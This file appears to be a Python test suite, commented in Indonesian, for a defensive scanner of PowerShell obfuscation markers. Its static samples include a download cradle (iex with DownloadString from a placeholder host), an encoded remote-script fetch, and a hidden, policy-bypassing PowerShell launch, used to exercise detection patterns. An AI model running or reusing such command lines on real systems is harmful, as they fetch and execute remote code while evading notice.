"""Nol jaringan — test ps_obf_scan (pemindai penanda obfuscation PowerShell).

Semua sampel = string statis di memori; tool tidak pernah mengeksekusi
skrip dan test tidak menyentuh jaringan.
"""
from __future__ import annotations

import base64
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "tools"))

import ps_obf_scan as ps  # noqa: E402


def enc_cmd(ps_text: str) -> str:
    return base64.b64encode(ps_text.encode("utf-16-le")).decode()


def checks(fnds):
    return {f["check"] for f in fnds}


CLEAN = """param($Name)
Get-Process -Name $Name | Select-Object -First 5
Write-Output "selesai"
"""


class TestScanText(unittest.TestCase):
    """Nol jaringan — taksonomi penanda pada string."""

    def test_bersih_tanpa_penanda(self):
        fnds, dec = ps.scan_text(CLEAN)
        self.assertEqual(fnds, [])
        self.assertEqual(dec, [])

    def test_encoded_command_terdekode(self):
        payload = enc_cmd("Get-Service; whoami")
        fnds, dec = ps.scan_text(f"powershell -EncodedCommand {payload}")
        self.assertIn("encoded-command", checks(fnds))
        self.assertEqual(fnds[0]["severity"], "high")
        self.assertEqual(len(dec), 1)
        self.assertIn("whoami", dec[0]["decoded"])
        self.assertEqual(dec[0]["encoding"], "utf-16le")

    def test_encoded_command_defang(self):
        payload = enc_cmd("iwr http://10.0.0.9/x.ps1 -OutFile a.txt")
        _, dec = ps.scan_text(f"powershell -ec {payload}")
        self.assertNotIn("http://10.0.0.9", dec[0]["decoded"])
        self.assertIn("hxxp", dec[0]["decoded"])
        self.assertIn("[.]", dec[0]["decoded"])

    def test_encoded_command_rusak_tetap_ditemukan(self):
        # payload cukup panjang tapi hasil dekodenya bukan teks plausibel:
        # temuan tetap ada, dekode gagal tercatat eksplisit (bukan crash,
        # bukan "bersih")
        fnds, dec = ps.scan_text(f"powershell -enc {'x' * 40}")
        self.assertIn("encoded-command", checks(fnds))
        self.assertEqual(len(dec), 1)
        self.assertEqual(dec[0]["decoded"], "")
        self.assertEqual(dec[0]["encoding"], "bukan-teks")

    def test_iex_dan_cradle(self):
        fnds, _ = ps.scan_text(
            "iex (New-Object Net.WebClient).DownloadString("
            "'http://x.example/x')")  # noqa: S113 — sampel statis, tidak diakses
        self.assertIn("iex-variant", checks(fnds))
        self.assertIn("web-cradle", checks(fnds))
        self.assertEqual(
            {f["severity"] for f in fnds}, {"high"})

    def test_xor_kompresi_stealth(self):
        fnds, _ = ps.scan_text(
            "$d = $d -bxor 0x37; [IO.Compression.DeflateStream]::new($ms)")
        self.assertIn("xor-loop", checks(fnds))
        self.assertIn("compression", checks(fnds))
        f2, _ = ps.scan_text("powershell -w Hidden -nop -ep bypass -f a.ps1")
        self.assertIn("stealth-flags", checks(f2))

    def test_tick_mark_dan_char_code(self):
        fnds, _ = ps.scan_text(
            "I`EX `n `s`t`r i`n`v`o`k`e; [char]0x68 + [char]0x69 + "
            "[char]0x20 + [char]0x21")
        self.assertIn("tick-mark", checks(fnds))
        self.assertIn("char-code", checks(fnds))

    def test_format_concat_replace(self):
        fnds, _ = ps.scan_text(
            "$a = 'x'+'y'+'z'; $b = ('i'+'e'+'x'); $c = $a.Replace('x','y')"
            ".Replace('y','z').Replace('z','w'); $d = '{0}{1}' -f $a, $b")
        self.assertIn("format-concat", checks(fnds))

    def test_securestring_env(self):
        fnds, _ = ps.scan_text(
            "$p = ConvertTo-SecureString 'x' -AsPlainText -Force; "
            "$u = $env:USERNAME; $t = $env:TEMP; $d = $env:APPDATA")
        self.assertIn("securestring", checks(fnds))
        self.assertIn("env-abuse", checks(fnds))
        self.assertEqual(
            [f for f in fnds if f["check"] == "env-abuse"][0]["severity"],
            "info")


class TestFilesAndCLI(unittest.TestCase):
    """Nol jaringan — pemindaian file + exit code."""

    def test_file_biner_fail_closed(self):
        with tempfile.NamedTemporaryFile(suffix=".ps1", delete=False) as fh:
            fh.write(b"MZ\x00\x90\x00" + b"\x00" * 64)
            p = fh.name
        try:
            r = ps.scan_source(Path(p).read_bytes(), p)
            self.assertEqual(r["findings"][0]["check"], "file-binary")
            self.assertEqual(r["findings"][0]["severity"], "high")
        finally:
            Path(p).unlink()

    def test_cli_exit_1_2_0(self):
        with tempfile.TemporaryDirectory() as td:
            bad = Path(td) / "evil.ps1"
            bad.write_text(f"powershell -EncodedCommand "
                           f"{enc_cmd('Get-Service; whoami')}",
                           encoding="utf-8")
            r1 = subprocess.run(
                [sys.executable, str(ROOT / "tools" / "ps_obf_scan.py"),
                 "--dir", td, "--json"],
                capture_output=True, text=True, timeout=60)
            self.assertEqual(r1.returncode, 1)
            out = json.loads(r1.stdout)
            self.assertEqual(out["schema"], "cyphron.ps-obf-scan/1")
            self.assertIn("encoded-command",
                          checks(out["results"][0]["findings"]))

            good = Path(td) / "ok.ps1"
            good.write_text(CLEAN, encoding="utf-8")
            r0 = subprocess.run(
                [sys.executable, str(ROOT / "tools" / "ps_obf_scan.py"),
                 "--file", str(good)],
                capture_output=True, text=True, timeout=60)
            self.assertEqual(r0.returncode, 0)
            self.assertIn("CLEAN_NO_OBFUSCATION_MARKERS", r0.stdout)

            r2 = subprocess.run(
                [sys.executable, str(ROOT / "tools" / "ps_obf_scan.py"),
                 "--file", str(Path(td) / "tak-ada.ps1")],
                capture_output=True, text=True, timeout=60)
            self.assertEqual(r2.returncode, 2)

    def test_cli_fail_on_medium(self):
        with tempfile.TemporaryDirectory() as td:
            f = Path(td) / "ticks.ps1"
            f.write_text("a`b`c`d`e`f", encoding="utf-8")
            rm = subprocess.run(
                [sys.executable, str(ROOT / "tools" / "ps_obf_scan.py"),
                 "--file", str(f), "--fail-on", "medium"],
                capture_output=True, text=True, timeout=60)
            self.assertEqual(rm.returncode, 1)
            rh = subprocess.run(
                [sys.executable, str(ROOT / "tools" / "ps_obf_scan.py"),
                 "--file", str(f)],
                capture_output=True, text=True, timeout=60)
            self.assertEqual(rh.returncode, 0)  # high gate: medium lolos

    def test_dir_kosong_exit_2(self):
        with tempfile.TemporaryDirectory() as td:
            r = subprocess.run(
                [sys.executable, str(ROOT / "tools" / "ps_obf_scan.py"),
                 "--dir", td],
                capture_output=True, text=True, timeout=60)
            self.assertEqual(r.returncode, 2)


if __name__ == "__main__":
    unittest.main()
